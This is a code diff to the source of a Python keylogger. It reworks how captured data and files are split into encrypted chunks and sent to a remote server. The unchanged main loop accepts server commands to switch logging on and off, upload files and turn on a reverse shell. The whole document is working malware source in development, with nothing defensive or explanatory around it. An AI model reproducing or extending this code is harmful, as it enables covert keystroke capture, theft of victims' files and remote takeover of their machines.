@@ -133,23 +133,25 @@ class Keylogger:
                 logging.debug(err)
                 time.sleep(self.reconnect_interval)
 
-    def send_to_server(self, data: str | bytes, filename: str = None, length: int = None):
-        isfile = False
+    def send_to_server(self, data: str | bytes, filename: str = None):
+        chunk_size = utils.BUFFSIZE-96  # chunk_size must be lower than BUFFSIZE, because encrypting adds some bytes to the chunk.        
         if isinstance(data, str):
-            data = data.encode(utils.ENCODING)
+            data = data.encode(utils.ENCODING) # if sent data is of type string, encode it to bytes
 
-        if all([filename, length]):
-            isfile = True
-            header = "__".join(["file",filename, str(length)]).encode(utils.ENCODING)
-            self.encrypt_and_send(header)
+        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
 
-        maxsize = utils.BUFFSIZE-96
-        chunks = [data[i:i + maxsize] for i in range(0, len(data), maxsize)]
+        # create and send header, containing filename and number of chunks that will be sent
+        if filename:
+            header = "__".join([filename, str(len(chunks))]).encode(utils.ENCODING)
+        else:
+            header = str(len(chunks)).encode(utils.ENCODING)
+        self.encrypt_and_send(header)
+        
         for chunk in chunks:
             self.encrypt_and_send(chunk)
             time.sleep(0.00001)
 
-        if isfile:
+        if filename:
             self.encrypt_and_send("done sending file".encode(utils.ENCODING))
 
     def encrypt_and_send(self, data):
@@ -242,8 +244,7 @@ if __name__ == "__main__":
                     keylogger.send_to_server("logging deactivated")
                 elif recv == "send":
                     filename = "test.png"
-                    data = utils.convert_file_to_bytes(filename, "tmp")
-                    keylogger.send_to_server(data=data, filename=filename, length=len(data))
+                    keylogger.send_to_server(data=utils.convert_file_to_bytes(filename, "tmp"), filename=filename)
                 elif recv == "shell":
                     reverse_shell_active = True
                     keylogger.send_to_server("reverse shell activated")
